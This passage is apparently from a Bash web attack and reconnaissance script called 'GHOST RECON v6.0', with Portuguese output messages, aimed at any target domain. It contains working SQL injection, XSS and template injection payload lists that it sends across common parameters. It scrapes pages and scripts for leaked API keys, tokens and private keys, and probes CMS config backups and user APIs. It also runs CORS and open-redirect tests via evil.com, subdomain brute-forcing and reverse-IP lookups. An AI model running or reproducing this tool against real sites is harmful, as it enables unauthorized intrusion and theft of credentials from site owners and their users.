SQLI_P=("'" "''" "' OR '1'='1" "' OR 1=1--" "\" OR 1=1--" "' UNION SELECT NULL--" "' UNION SELECT NULL,NULL--" "1 AND SLEEP(5)--" "1' AND SLEEP(5)--" "'; WAITFOR DELAY '0:0:5'--" "' ORDER BY 100--" "' AND EXTRACTVALUE(0,CONCAT(0x7e,VERSION()))--")
SQLI_E=("sql syntax" "mysql_fetch" "You have an error in your SQL" "ORA-[0-9]" "PostgreSQL.*ERROR" "SQLSTATE" "Unclosed quotation mark" "ODBC SQL Server" "Division by zero" "DB Error" "database error" "Warning.*mysql_" "pg_query" "SQLite.*error" "Microsoft.*Database.*Error" "stack trace:")
SQLI_PARAMS=(id page cat p q search s item user uid lang type action module key name value data input order sort by limit)
for param in "${SQLI_PARAMS[@]}"; do
  for payload in "${SQLI_P[@]}"; do
    (
    ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
    T1=$(date +%s%3N 2>/dev/null || echo 0)
    R=$(curl -sk --max-time 9 "$URL/?$param=$ENC" 2>/dev/null)
    T2=$(date +%s%3N 2>/dev/null || echo 0)
    EL=$(( T2 - T1 ))
    for err in "${SQLI_E[@]}"; do
      echo "$R" | grep -qiE "$err" && {
        v "SQLi Error-Based: ?$param= | $URL/?$param=$ENC"
        echo "$R" | grep -iE "$err" | head -2 | while read l; do s "$l"; done
        exit 0
      }
    done
    [ "$EL" -ge 4500 ] && v "SQLi Time-Based Blind: ?$param= (${EL}ms) | $URL/?$param=$ENC"
    ) &
    [ $(jobs -r | wc -l) -ge 40 ] && wait
  done
done
wait

t "XSS"
XSS_P=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg onload=alert(1)>" "\"'><script>alert(1)</script>" "javascript:alert(1)" "{{7*7}}" "<body onload=alert(1)>" "<input autofocus onfocus=alert(1)>")
XSS_PARAMS=(q search s name value message comment title text body content query input)
for param in "${XSS_PARAMS[@]}"; do
  for payload in "${XSS_P[@]}"; do
    (
    ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
    R=$(curl -sk --max-time 5 "$URL/?$param=$ENC" 2>/dev/null)
    echo "$R" | grep -qF "$payload" && v "XSS Refletido: ?$param= | $URL/?$param=$ENC"
    (echo "$payload" | grep -q "7\*7") && echo "$R" | grep -q "49" && v "SSTI detectado: ?$param= | $URL/?$param=$ENC"
    ) &
    [ $(jobs -r | wc -l) -ge 30 ] && wait
  done
done
wait

t "API KEYS / SECRETS LEAK"
scan_keys(){
  CONTENT="$1"; SRC="$2"
  declare -A PATS=(
    ["AIza[0-9A-Za-z_-]{35}"]="Google API Key"
    ["AKIA[0-9A-Z]{16}|AKID[A-Z0-9]{16}"]="AWS Access Key"
    ["sk_live_[0-9a-zA-Z]{24,}"]="Stripe Live Key"
    ["sk_test_[0-9a-zA-Z]{24,}"]="Stripe Test Key"
    ["xox[baprs]-[0-9a-zA-Z-]{24,}"]="Slack Token"
    ["ghp_[0-9a-zA-Z]{36}"]="GitHub Token"
    ["glpat-[0-9a-zA-Z_-]{20}"]="GitLab Token"
    ["eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}"]="JWT Token"
    ["-----BEGIN.*PRIVATE KEY"]="Private Key"
    ["mongodb(\+srv)?://[^\"' ]{10,}"]="MongoDB connstr"
    ["redis://[^\"' ]{8,}"]="Redis connstr"
    ["postgres(ql)?://[^\"' ]{8,}"]="PG connstr"
    ["mysql://[^\"' ]{8,}"]="MySQL connstr"
    ["SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}"]="SendGrid Key"
    ["npm_[a-zA-Z0-9]{36}"]="NPM Token"
    ["ya29\.[0-9A-Za-z_-]+"]="Google OAuth Token"
    ["[Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd][\"' ]*[:=][\"' ]*[^\"' \n]{8,}"]="Hardcoded Password"
    ["[Ss][Ee][Cc][Rr][Ee][Tt][_Kk][Ee][Yy][\"' ]*[:=][\"' ]*[^\"' \n]{16,}"]="Secret Key"
    ["[Aa][Pp][Ii][_-][Kk][Ee][Yy][\"' ]*[:=][\"' ]*[^\"' \n]{16,}"]="API Key"
    ["[Aa][Cc][Cc][Ee][Ss][Ss][_-][Tt][Oo][Kk][Ee][Nn][\"' ]*[:=][\"' ]*[^\"' \n]{16,}"]="Access Token"
  )
  for pat in "${!PATS[@]}"; do
    MATCH=$(echo "$CONTENT" | grep -oiE "$pat" | head -2)
    [ -n "$MATCH" ] && v "${PATS[$pat]} em $SRC" && s "  $MATCH"
  done
}
PAGE_MAIN=$(curl -sk --max-time 10 "$URL" 2>/dev/null)
scan_keys "$PAGE_MAIN" "$URL"
echo "$PAGE_MAIN" | grep -oE 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//' | head -20 | while read jsf; do
  [ -z "$jsf" ] && continue
  JSURL="$URL$jsf"; [[ "$jsf" == http* ]] && JSURL="$jsf"
  (JSC=$(curl -sk --max-time 6 "$JSURL" 2>/dev/null); [ -n "$JSC" ] && scan_keys "$JSC" "$JSURL") &
done
wait

t "CMS SCAN"
if echo "$PAGE_MAIN" | grep -qi "wp-content\|wp-includes"; then
  i "WordPress detectado"
  C=$(curl -sk --max-time 4 -o /dev/null -w "%{http_code}" "$URL/readme.html" 2>/dev/null)
  [ "$C" = "200" ] && v "WP readme.html: $URL/readme.html"
  for f in wp-config.php.bak wp-config.php~ wp-config.php.old; do
    C=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$URL/$f" 2>/dev/null)
    [ "$C" = "200" ] && v "WP config backup: $URL/$f"
  done
  WPUR=$(curl -sk --max-time 5 "$URL/wp-json/wp/v2/users" 2>/dev/null)
  echo "$WPUR" | grep -qi '"slug"' && {
    v "WP Users API exposta: $URL/wp-json/wp/v2/users"
    echo "$WPUR" | python3 -c "import sys,json; [print('  user:',u.get('name',''),u.get('slug','')) for u in json.load(sys.stdin)]" 2>/dev/null | head -5 | while read l; do s "$l"; done
  }
  XMLRPC=$(curl -sk --max-time 4 "$URL/xmlrpc.php" 2>/dev/null)
  echo "$XMLRPC" | grep -qi "XML-RPC\|xmlrpc" && v "xmlrpc.php ativo: $URL/xmlrpc.php"
  s "WP Login: $URL/wp-login.php | WP Admin: $URL/wp-admin/"
  for plugin in contact-form-7 yoast-seo woocommerce elementor revolution-slider wp-file-manager; do
    C=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$URL/wp-content/plugins/$plugin/readme.txt" 2>/dev/null)
    [ "$C" = "200" ] && s "WP Plugin: $plugin"
  done
fi
if echo "$PAGE_MAIN" | grep -qi "joomla"; then
  i "Joomla detectado"
  adm "$URL/administrator"
  C=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$URL/configuration.php.bak" 2>/dev/null)
  [ "$C" = "200" ] && v "Joomla config backup: $URL/configuration.php.bak"
fi
if echo "$PAGE_MAIN" | grep -qi "drupal"; then
  i "Drupal detectado"
  adm "$URL/admin/config"
  C=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$URL/sites/default/settings.php" 2>/dev/null)
  [ "$C" = "200" ] && v "Drupal settings.php: $URL/sites/default/settings.php"
fi

t "CORS / OPEN REDIRECT"
CORS_R=$(curl -sI --max-time 6 -H "Origin: https://evil.com" "$URL" 2>/dev/null)
ACAO=$(echo "$CORS_R" | grep -i "Access-Control-Allow-Origin" | head -1)
echo "$ACAO" | grep -qi "evil.com\|\*" && v "CORS misconfiguration: $ACAO"
echo "$CORS_R" | grep -qi "Access-Control-Allow-Credentials: true" && echo "$ACAO" | grep -qi "evil.com" && v "CORS + Credentials=true CRITICO"
for param in url redirect return next go to dest destination location href callback; do
  for payload in "https://evil.com" "//evil.com" "https://$DOMAIN@evil.com"; do
    ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
    LOC=$(curl -sk --max-time 4 -D - -o /dev/null "$URL/?$param=$ENC" 2>/dev/null | grep -i "^Location:" | head -1)
    echo "$LOC" | grep -qi "evil.com" && { v "Open Redirect: ?$param= | $URL/?$param=$ENC"; break 2; }
  done
done

t "SENSITIVE DATA"
EMAILS=$(echo "$PAGE_MAIN" | grep -oiE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | grep -v "example\|test\|\.png\|\.jpg\|sentry\|schemas" | sort -u | head -8)
[ -n "$EMAILS" ] && w "Emails expostos:" && echo "$EMAILS" | while read e; do s "$e"; done
INTERNAL=$(echo "$PAGE_MAIN" | grep -oE '(10\.[0-9]+\.[0-9]+\.[0-9]+|172\.(1[6-9]|2[0-9]|3[01])\.[0-9]+\.[0-9]+|192\.168\.[0-9]+\.[0-9]+)' | sort -u | head -5)
[ -n "$INTERNAL" ] && v "IPs internos no HTML: $INTERNAL"
COMMENTS=$(echo "$PAGE_MAIN" | grep -oiE '<!--[^-]{5,300}-->' | grep -iE "password|secret|key|todo|hack|debug|admin|database|token" | head -3)
[ -n "$COMMENTS" ] && v "HTML comments suspeitos:" && echo "$COMMENTS" | while read c; do s "$c"; done
VERSION=$(curl -sI --max-time 5 "$URL" 2>/dev/null | grep -iE "^Server:|^X-Powered-By:|^X-Generator:" | head -3)
[ -n "$VERSION" ] && w "Versao exposta: $VERSION"
ROBOTS=$(curl -sk --max-time 5 "$URL/robots.txt" 2>/dev/null)
if [ -n "$ROBOTS" ]; then
  i "robots.txt Disallow paths:"
  echo "$ROBOTS" | grep -i "Disallow:" | awk '{print $2}' | while read p; do [ -n "$p" ] && s "$URL$p"; done
fi

t "SUBDOMINIOS"
WORDLIST="www mail ftp smtp pop imap webmail cpanel whm api api2 api3 dev dev2 stage staging test beta alpha preview cdn static assets app apps mobile m wap admin portal vpn remote ns1 ns2 ns3 mx mx1 support help docs status dashboard monitor git jenkins ci cd prod uat qa old backup sec secure"
for sub in $WORDLIST; do
  (
  SIP=$(dig +short "$sub.$DOMAIN" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
  if [ -n "$SIP" ]; then
    [ "$SIP" != "$IP" ] && v "Subdomain IP diferente: $sub.$DOMAIN -> $SIP" || s "$sub.$DOMAIN -> $SIP"
    SCODE=$(curl -sk --max-time 4 -o /dev/null -w "%{http_code}" "https://$sub.$DOMAIN" 2>/dev/null)
    SBODY=$(curl -sk --max-time 4 "https://$sub.$DOMAIN" 2>/dev/null | head -c 300)
    echo "$SBODY" | grep -qiE "login|admin|dashboard|panel|phpmyadmin|grafana" && adm "https://$sub.$DOMAIN ($SCODE)"
  fi
  ) &
  [ $(jobs -r | wc -l) -ge 25 ] && wait
done
wait
curl -s --max-time 10 "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" 2>/dev/null | grep -v "error\|limit\|API" | head -12 | while read l; do [ -n "$l" ] && s "HackerTarget: $l"; done

t "REVERSE IP"
host "$IP" 2>/dev/null | while read l; do s "PTR: $l"; done
REVIP=$(curl -s --max-time 8 "https://api.hackertarget.com/reverseiplookup/?q=$IP" 2>/dev/null | grep -v "error\|limit\|API")
if [ -n "$REVIP" ]; then
  COUNT=$(echo "$REVIP" | wc -l)
  i "$COUNT dominios no mesmo IP:"
  echo "$REVIP" | head -12 | while read d; do [ -n "$d" ] && s "$d"; done
  [ "$COUNT" -gt 12 ] && s "... +$(( COUNT-12 )) dominios"
fi

t "EMAIL OSINT"
SPF=$(dig +short "$DOMAIN" TXT 2>/dev/null | grep -i spf | head -1)
[ -n "$SPF" ] && s "SPF:   $SPF" || w "SPF nao configurado"
DMARC=$(dig +short "_dmarc.$DOMAIN" TXT 2>/dev/null | head -1)
[ -n "$DMARC" ] && s "DMARC: $DMARC" || w "DMARC nao configurado"
for sel in default google selector1 selector2 k1 mail dkim s1 2024 2025; do
  D=$(dig +short "${sel}._domainkey.$DOMAIN" TXT 2>/dev/null)
  [ -n "$D" ] && s "DKIM [$sel]: $(echo $D | head -c 80)"
done

t "TRACEROUTE"
traceroute -m 10 -w 2 "$IP" 2>/dev/null | while read line; do
  HOP_IP=$(echo "$line" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
  if [ -n "$HOP_IP" ]; then
    XG=$(curl -s --max-time 2 "http://ip-api.com/json/$HOP_IP?fields=country,city" 2>/dev/null)
    CTR=$(echo $XG | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
    [ -n "$CTR" ] && s "$line [$CTR / $(echo $XG|grep -o '"city":"[^"]*"'|cut -d'"' -f4)]" || s "$line"
  else
    s "$line"
  fi
done

# ── RELATORIO FINAL ───────────────────────────────────────────
echo ""
echo "========================================" | tee -a "$LOG"
echo "GHOST RECON v6.0 - RELATORIO FINAL" | tee -a "$LOG"
echo "Alvo: $DOMAIN ($IP)" | tee -a "$LOG"
echo "Data: $(date)" | tee -a "$LOG"
echo "========================================" | tee -a "$LOG"
echo ""
i "VULNERABILIDADES: $VULN"

if [ ${#ADMIN_PANELS[@]} -gt 0 ]; then
  echo ""
  echo -e "${W}[PAINEIS ADM ABERTOS (${#ADMIN_PANELS[@]})]${N}" | tee -a "$LOG"
  for u in "${ADMIN_PANELS[@]}"; do echo -e "  ${G}>> $u${N}" | tee -a "$LOG"; done
fi

if [ ${#DB_EXPOSED[@]} -gt 0 ]; then
  echo ""
  echo -e "${W}[DATABASES EXPOSTOS (${#DB_EXPOSED[@]})]${N}" | tee -a "$LOG"
  for u in "${DB_EXPOSED[@]}"; do echo -e "  ${R}>> $u${N}" | tee -a "$LOG"; done
fi

if [ ${#FILES_EXPOSED[@]} -gt 0 ]; then
  echo ""
  echo -e "${W}[ARQUIVOS SENSIVEIS (${#FILES_EXPOSED[@]})]${N}" | tee -a "$LOG"
  for u in "${FILES_EXPOSED[@]}"; do echo -e "  ${Y}>> $u${N}" | tee -a "$LOG"; done
fi

if [ ${#VULN_LIST[@]} -gt 0 ]; then
  echo ""
  echo -e "${W}[TODAS AS VULNERABILIDADES (${#VULN_LIST[@]})]${N}" | tee -a "$LOG"
  for u in "${VULN_LIST[@]}"; do echo -e "  ${R}>> $u${N}" | tee -a "$LOG"; done
fi

echo ""
echo -e "Log completo: ${C}$LOG${N}" | tee -a "$LOG"
echo "========================================" | tee -a "$LOG"
